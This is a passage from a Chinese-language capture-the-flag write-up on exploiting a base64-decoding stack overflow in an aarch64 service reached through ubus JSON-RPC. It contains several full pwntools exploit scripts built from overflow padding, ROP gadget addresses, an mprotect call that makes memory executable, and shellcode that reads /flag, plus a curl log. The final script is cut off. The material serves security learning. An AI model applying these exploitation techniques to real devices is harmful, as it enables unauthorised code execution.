class="number">0</span>;</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      {</span><br><span class="line">        v10 = v24++;</span><br><span class="line">        v9 = byte_4A1F98[json_input[v10]];</span><br><span class="line">      }</span><br><span class="line">      v18 = v9;</span><br><span class="line">      v17 = v9 + (v21 &lt;&lt; <span class="number">18</span>) + (v20 &lt;&lt; <span class="number">12</span>) + (v19 &lt;&lt; <span class="number">6</span>);</span><br><span class="line">      <span class="keyword">if</span> ( len &gt; v23 )</span><br><span class="line">      {</span><br><span class="line">        v11 = v23++;</span><br><span class="line">        v16[v11] = BYTE2(v17);</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">if</span> ( len &gt; v23 )</span><br><span class="line">      {</span><br><span class="line">        v12 = v23++;</span><br><span class="line">        v16[v12] = BYTE1(v17);</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">if</span> ( len &gt; v23 )</span><br><span class="line">      {</span><br><span class="line">        v13 = v23++;</span><br><span class="line">        v16[v13] = v17;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    sub_4002B0();</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>在decode最前面，会得到长度。如果decode的时候存在=号则len–，可以看到最后v16中的index并没有进行检查大小，导致溢出</p><p>到此漏洞点寻找完成</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>接下来就是如何去利用这个漏洞，首先看一下保护</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     aarch64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></tbody></table></figure><p>可以直接覆盖返回地址来劫持程序流，写出如下poc</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> system</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./base64'</span></span><br><span class="line"></span><br><span class="line">r = process([file_name, <span class="string">'call'</span>, <span class="string">'decode'</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbgg</span>():</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line">dbgg()</span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b'aaaa'</span></span><br><span class="line">p1 = p1.ljust(<span class="number">0x458</span>, <span class="string">b"a"</span>)</span><br><span class="line"></span><br><span class="line">p1 = base64.b64encode(p1)</span><br><span class="line">ret = <span class="number">0x406550</span></span><br><span class="line"></span><br><span class="line">li(p1)</span><br><span class="line"></span><br><span class="line">p2 = <span class="string">b'{"input":"'</span> + p1 + <span class="string">b'"}'</span></span><br><span class="line">li(p2)</span><br><span class="line"></span><br><span class="line">r.sendline(p2)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure><p>调试的时候发现会在下面这个地方SIGSEGV了</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x406280</span>    ldrb   w0, [x0]</span><br><span class="line">  <span class="number">0x406284</span>    cmp    w0, <span class="comment">#0x3d</span></span><br><span class="line">  <span class="number">0x406288</span>    b.ne   <span class="comment">#0x4062a0                     &lt;0x4062a0&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>看一下汇编</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000406274 E0 4B 84 B9                   LDRSW           X0, [SP,#0x450+var8]</span><br><span class="line">.text:0000000000406278 E1 0F 40 F9                   LDR             X1, [SP,#0x450+var_438]</span><br><span class="line">.text:000000000040627C 20 00 00 8B                   ADD             X0, X1, X0</span><br><span class="line">.text:0000000000406280 00 00 40 39                   LDRB            W0, [X0]</span><br><span class="line">.text:0000000000406284 1F F4 00 71                   CMP             W0, #0x3D ; '='</span><br></pre></td></tr></tbody></table></figure><p>X0这里的地址取错了，<code>0x450 - 8 = 0x448 = v24</code>，在溢出的时候把v24给覆盖了之后导致的SIGSEGV结果</p><p>所以需要把v22 v23 v24 v25都处置正确才可以继续</p><p>所以写了如下poc</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> system</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./base64'</span></span><br><span class="line"></span><br><span class="line">r = process([file_name, <span class="string">'call'</span>, <span class="string">'decode'</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbgg</span>():</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line">dbgg()</span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b''</span></span><br><span class="line">p1 = p1.ljust(<span class="number">0x418</span>, <span class="string">b'a'</span>)</span><br><span class="line">p1 += <span class="string">b'\x77\x77\x00\x00'</span></span><br><span class="line">p1 += <span class="string">b'\x1d\x04\x00\x00'</span>   <span class="comment">#0x418 + 0x4 + 1</span></span><br><span class="line">p1 += <span class="string">b'\x84\x05\x00\x00'</span>   <span class="comment">#</span></span><br><span class="line">p1 += <span class="string">b'\x77\x07\x00\x00'</span></span><br><span class="line">p1 += p64(<span class="number">0</span>)</span><br><span class="line">p1 += <span class="string">b'b'</span> * <span class="number">8</span></span><br><span class="line"></span><br><span class="line">p1 = base64.b64encode(p1)</span><br><span class="line">ret = <span class="number">0x406550</span></span><br><span class="line"></span><br><span class="line">li(p1)</span><br><span class="line"></span><br><span class="line">p2 = <span class="string">b'{"input":"'</span> + p1 + <span class="string">b'"}'</span></span><br><span class="line">li(p2)</span><br><span class="line"></span><br><span class="line">r.sendline(p2)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure><p>发现可以成功控制ret为0x6262626262626262，接下来就是构造rop</p><p>没找到system，但是发现了mprotect</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_423340</span><span class="params">(<span class="type">void</span> *a1, <span class="type">size_t</span> a2, <span class="type">int</span> a3)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">unsigned</span> __int64 result; <span class="comment">// x0</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// w1</span></span><br><span class="line"></span><br><span class="line">  result = linux_eabi_syscall(__NR_mprotect, a1, a2, a3);</span><br><span class="line">  <span class="keyword">if</span> ( result &gt;= <span class="number">0xFFFFFFFFFFFFF001</span>LL )</span><br><span class="line">  {</span><br><span class="line">    v4 = result;</span><br><span class="line">    result = <span class="number">-1LL</span>;</span><br><span class="line">    *(&amp;dword_4A8590 + _ReadStatusReg(ARM64_SYSREG(<span class="number">3</span>, <span class="number">3</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">2</span>))) = -v4;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>如果可以控制<code>a1，a2，a3</code>就可以直接分配rwx来执行shellcode，用rwctf shellfind的方法来看交叉引用，从而寻找可以控制<code>a1 a2 a3</code>中的一个，并且可以同时执行<code>sub_423340</code>的地址</p><p>这样做的原因是因为笔者直接找借助x21 x19然后mov到x1 x2的gadgets，但是控制之后执行<code>sub_423340</code>会因为x21 x19的设置导致一些问题</p><p>如果可以控制<code>a1, a2, a3</code>中的任何一个并且可以执行<code>sub_423340</code>，这个时候就可以跳到shellcode那里了</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004578A8 61 EE 41 F9                   LDR             X1, [X19,#0x3D8]</span><br><span class="line">.text:00000000004578AC 60 F2 41 F9                   LDR             X0, [X19,#0x3E0]</span><br><span class="line">.text:00000000004578B0 21 00 00 CB                   SUB             X1, X1, X0</span><br><span class="line">.text:00000000004578B4 80 00 00 8B                   ADD             X0, X4, X0</span><br><span class="line">.text:00000000004578B8 A2 2E FF 97                   BL              sub_423340</span><br></pre></td></tr></tbody></table></figure><p>上面这一段就符合要求，控制了x19之后然后再控制x2，最后到上面这一段</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004579A4 E2 00 80 52                   MOV             W2, #7</span><br><span class="line">.text:00000000004579A8 FD 03 00 91                   MOV             X29, SP</span><br><span class="line">.text:00000000004579AC 03 48 42 F9                   LDR             X3, [X0,#0x490]</span><br><span class="line">.text:00000000004579B0 01 4C 42 F9                   LDR             X1, [X0,#0x498]</span><br><span class="line">.text:00000000004579B4 00 50 42 F9                   LDR             X0, [X0,#0x4A0]</span><br><span class="line">.text:00000000004579B8 21 00 00 CB                   SUB             X1, X1, X0</span><br><span class="line">.text:00000000004579BC 60 00 00 8B                   ADD             X0, X3, X0</span><br><span class="line">.text:00000000004579C0 60 2E FF 97                   BL              sub_423340</span><br></pre></td></tr></tbody></table></figure><p>官方wp上的要更简单，控制x0即可，然后跳到shellcode那里</p><p>shellcode可以用orw，下面是用base64运行时的exp，可以看到flag成功被输出</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> system</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'aarch64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./base64'</span></span><br><span class="line"></span><br><span class="line">r = process([file_name, <span class="string">'call'</span>, <span class="string">'decode'</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbgg</span>():</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line">dbgg()</span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.aarch64.linux.<span class="built_in">open</span>(<span class="string">"/flag"</span>, <span class="number">0</span>)</span><br><span class="line">shellcode += shellcraft.aarch64.linux.read(<span class="number">3</span>, <span class="number">0x4a2098</span>, <span class="number">0x100</span>)</span><br><span class="line">shellcode += shellcraft.aarch64.linux.write(<span class="number">1</span>, <span class="number">0x4a2098</span>, <span class="number">0x100</span>)</span><br><span class="line">p1 = asm(shellcode)</span><br><span class="line">p1 = p1.ljust(<span class="number">0x200</span>, <span class="string">b'a'</span>)</span><br><span class="line">p1 += p64(<span class="number">0</span>) + p64(<span class="number">0x4A3000</span>) + p64(<span class="number">0x4A0000</span>)</span><br><span class="line">p1 = p1.ljust(<span class="number">0x418</span>, <span class="string">b'a'</span>)</span><br><span class="line">p1 += <span class="string">b'\x77\x77\x00\x00'</span></span><br><span class="line">p1 += <span class="string">b'\x1d\x04\x00\x00'</span>   <span class="comment">#0x418 + 0x4 + 1</span></span><br><span class="line">p1 += <span class="string">b'\x84\x05\x00\x00'</span>   <span class="comment">#</span></span><br><span class="line">p1 += <span class="string">b'\x77\x07\x00\x00'</span></span><br><span class="line">p1 += p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x000000000040064c : ldr x19, [sp, #0x10] ; ldp x29, x30, [sp], #0x20 ; ret</span></span><br><span class="line">gadget1 = <span class="number">0x000000000040064c</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x0000000000417920 : ldr x21, [sp, #0x20] ; ldp x29, x30, [sp], #0x30 ; ret</span></span><br><span class="line">gadget2 = <span class="number">0x0000000000417920</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x000000000040a95c : ldr x23, [sp, #0x30] ; ldp x29, x30, [sp], #0x40 ; ret</span></span><br><span class="line">gadget3 = <span class="number">0x000000000040a95c</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x00000000004598c0 : ldp x19, x20, [sp, #0x10] ; mov x0, x3 ; ldp x29, x30, [sp], #0x50 ; ret</span></span><br><span class="line">gadget4 = <span class="number">0x00000000004598c0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x0000000000444e14 : svc #0 ; ldp x21, x22, [sp, #0x20] ; mov w0, w19 ; ldp x19, x20, [sp, #0x10] ; ldp x29, x30, [sp], #0x40 ; ret</span></span><br><span class="line">gadget6 = <span class="number">0x0000000000444e14</span></span><br><span class="line"><span class="comment"># 0x435338</span></span><br><span class="line">gadget5 = <span class="number">0x435338</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">mov x1, x23</span></span><br><span class="line"><span class="string">mov x0, x19</span></span><br><span class="line"><span class="string">mov x2, x21</span></span><br><span class="line"><span class="string">blr x20</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">.text:00000000004578A8 61 EE 41 F9                   LDR             X1, [X19,#0x3D8]</span></span><br><span class="line"><span class="string">.text:00000000004578AC 60 F2 41 F9                   LDR             X0, [X19,#0x3E0]</span></span><br><span class="line"><span class="string">.text:00000000004578B0 21 00 00 CB                   SUB             X1, X1, X0</span></span><br><span class="line"><span class="string">.text:00000000004578B4 80 00 00 8B                   ADD             X0, X4, X0</span></span><br><span class="line"><span class="string">.text:00000000004578B8 A2 2E FF 97                   BL              sub_423340</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">.text:00000000004579A4 E2 00 80 52                   MOV             W2, #7</span></span><br><span class="line"><span class="string">.text:00000000004579A8 FD 03 00 91                   MOV             X29, SP</span></span><br><span class="line"><span class="string">.text:00000000004579AC 03 48 42 F9                   LDR             X3, [X0,#0x490]</span></span><br><span class="line"><span class="string">.text:00000000004579B0 01 4C 42 F9                   LDR             X1, [X0,#0x498]</span></span><br><span class="line"><span class="string">.text:00000000004579B4 00 50 42 F9                   LDR             X0, [X0,#0x4A0]</span></span><br><span class="line"><span class="string">.text:00000000004579B8 21 00 00 CB                   SUB             X1, X1, X0</span></span><br><span class="line"><span class="string">.text:00000000004579BC 60 00 00 8B                   ADD             X0, X3, X0</span></span><br><span class="line"><span class="string">.text:00000000004579C0 60 2E FF 97                   BL              sub_423340</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">magic_gadget = <span class="number">0x00000000004579A4</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x0000000000400898 : ldr x0, [sp, #0x20] ; ldp x29, x30, [sp], #0x30 ; ret</span></span><br><span class="line">gadget7 = <span class="number">0x0000000000400898</span></span><br><span class="line"></span><br><span class="line">mprotect_addr = <span class="number">0x423340</span></span><br><span class="line">base64_decode_addr = <span class="number">0x4a2098</span></span><br><span class="line"><span class="comment">#p1 += p64(0x00000000004579A4)</span></span><br><span class="line"><span class="comment">#p1 += p64(0x0000000000403ad8)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">p1 += p64(gadget4)</span></span><br><span class="line"><span class="string">p1 += b'\x00' * 0x20</span></span><br><span class="line"><span class="string">p1 += p64(0) + p64(gadget1)</span></span><br><span class="line"><span class="string">p1 += p64(0) + p64(mprotect_addr)</span></span><br><span class="line"><span class="string">p1 += b'\x00' * 0x30</span></span><br><span class="line"><span class="string">p1 += p64(0) + p64(gadget2)</span></span><br><span class="line"><span class="string">p1 += p64(0x4a2000) # x19</span></span><br><span class="line"><span class="string">p1 += p64(0) * 2 + p64(gadget3)</span></span><br><span class="line"><span class="string">p1 += p64(0) * 2 + p64(7) # x21</span></span><br><span class="line"><span class="string">p1 += p64(0)</span></span><br><span class="line"><span class="string">p1 += p64(0) + p64(base64_decode_addr)</span></span><br><span class="line"><span class="string">p1 += p64(0) * 4  + p64(0x7000)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">p1 += p64(gadget7)</span><br><span class="line">p1 += <span class="string">b'\x00'</span> * <span class="number">0x20</span></span><br><span class="line">p1 += p64(<span class="number">0</span>) + p64(magic_gadget)</span><br><span class="line">p1 += p64(<span class="number">0</span>) * <span class="number">2</span> + p64(base64_decode_addr + <span class="number">0x200</span> - <span class="number">0x490</span>)</span><br><span class="line">p1 += p64(base64_decode_addr) * <span class="number">5</span></span><br><span class="line"></span><br><span class="line">p1 = base64.b64encode(p1)</span><br><span class="line">ret = <span class="number">0x406550</span></span><br><span class="line"></span><br><span class="line">li(p1)</span><br><span class="line"></span><br><span class="line">p2 = <span class="string">b'{"input":"'</span> + p1 + <span class="string">b'"}'</span></span><br><span class="line">li(p2)</span><br><span class="line"></span><br><span class="line">r.sendline(p2)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure><p>但是远程的时候会出现问题</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">*   Trying 127.0.0.1:9999...</span><br><span class="line">* TCP_NODELAY set</span><br><span class="line">* Connected to 127.0.0.1 (127.0.0.1) port 9999 (#0)</span><br><span class="line">&gt; POST /ubus HTTP/1.1</span><br><span class="line">&gt; Host: 127.0.0.1:9999</span><br><span class="line">&gt; User-Agent: curl/7.68.0</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; Content-Length: 1721</span><br><span class="line">&gt; Content-Type: application/x-www-form-urlencoded</span><br><span class="line">&gt; Expect: 100-continue</span><br><span class="line">&gt;</span><br><span class="line">* Mark bundle as not supporting multiuse</span><br><span class="line">&lt; HTTP/1.1 100 Continue</span><br><span class="line">* We are completely uploaded and fine</span><br><span class="line">* Mark bundle as not supporting multiuse</span><br><span class="line">&lt; HTTP/1.1 200 OK</span><br><span class="line">&lt; Connection: Keep-Alive</span><br><span class="line">&lt; Transfer-Encoding: chunked</span><br><span class="line">&lt; Keep-Alive: timeout=20</span><br><span class="line">&lt; Content-Type: application/json</span><br><span class="line">&lt;</span><br><span class="line">* Connection #0 to host 127.0.0.1 left intact</span><br><span class="line">{"jsonrpc":"2.0","id":null,"result":[2]}</span><br></pre></td></tr></tbody></table></figure><p>result里没有flag的输出，是因为输出的格式是<code>{"output":"flag"}</code>，而上面的<code>0x4a2098</code>这里直接存放的是flag，所以需要在一个地址里构造一下<code>{"output": "</code>，然后再将flag放到后面，最后加上<code>"}</code>即可</p><p>最终本地exp如下</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> system</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'aarch64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./base64'</span></span><br><span class="line"></span><br><span class="line">r = process([file_name, <span class="string">'call'</span>, <span class="string">'decode'</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbgg</span>():</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line">dbgg()</span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.aarch64.linux.<span class="built_in">open</span>(<span class="string">"/flag"</span>, <span class="number">0</span>)</span><br><span class="line">shellcode += 